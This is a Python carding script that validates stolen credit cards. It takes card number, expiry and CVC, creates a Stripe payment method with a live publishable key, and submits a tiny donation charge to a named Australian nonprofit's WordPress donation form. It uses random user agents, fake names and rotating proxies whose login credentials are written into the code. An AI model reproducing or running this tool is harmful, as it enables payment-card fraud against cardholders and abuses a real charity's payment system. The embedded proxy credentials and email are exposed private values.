import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio

proxies_list = [
    "http://qlpowtam-rotate:skbb6fly11gl@p.webshare.io:80",
    "http://gpeprqkm-rotate:2qzjcjbj0pml@p.webshare.io:80",
    "http://bwzexlib-rotate:snasn9oyfzsa@p.webshare.io:80"
]

names = ["John", "Emma", "Liam", "Olivia", "Smith", "Brown", "Davis", "Jones"]

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvp = ccx.split("|")[3]
    user_agent = UserAgent().random
    name=random.choice(names)
    r = requests.session()
    proxy = random.choice(proxies_list)
    proxies = {
    "http": proxy,
    }
    data = {
    "billing_details[email]": "kamisamakami252@gmail.com",
    "billing_details[name]": name,
    "billing_details[address][postal_code]": "80123",
    "billing_details[address][country]": "US",
    "type": "card",
    "card[number]": n,
    "card[cvc]": cvp,
    "card[exp_year]": yy,
    "card[exp_month]": mm,
    "key":     "pk_live_51KT2RvLSYBr599jmUYDUirjEvD3cu9kWKRQ6uJdleVILixsGu9vAl6gyT375v9hbm3GNAYU5rHg94eYLl4HEG77H004qAfe7Cc",
     "_stripe_account": "acct_1QTbNHE1Eq3DqEdP"
}


    response = requests.post('https://api.stripe.com/v1/payment_methods', data=data, proxies=proxies)
    try:
        pm = (response.json()['id'])
    except KeyError:
        print('error')

    headers = {
    'authority': 'limestonecoastsustainablefutures.com.au',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://limestonecoastsustainablefutures.com.au',
    'referer': 'https://limestonecoastsustainablefutures.com.au/donate-to-the-limestone-coast-sustainable-futures-association-today/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent,
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'action': 'wp_full_stripe_inline_donation_charge',
    'wpfs-form-name': 'Donation',
    'wpfs-form-get-parameters': '%7B%7D',
    'wpfs-custom-amount': 'other',
    'wpfs-custom-amount-unique': '0.3',
    'wpfs-donation-frequency': 'one-time',
    'wpfs-card-holder-email': 'kamisamakami252@gmail.com',
    'wpfs-card-holder-name': name,
    'wpfs-stripe-payment-method-id': pm,
}
    time.sleep(0.3)
    responsey = requests.post(
    'https://limestonecoastsustainablefutures.com.au/wp-admin/admin-ajax.php',
    headers=headers,
    data=data,
    proxies=proxies
)
    print(ccx, responsey.text)
    try:
        return responsey.json()
    except:
        #print('iiii')
        return 'API request failed.'
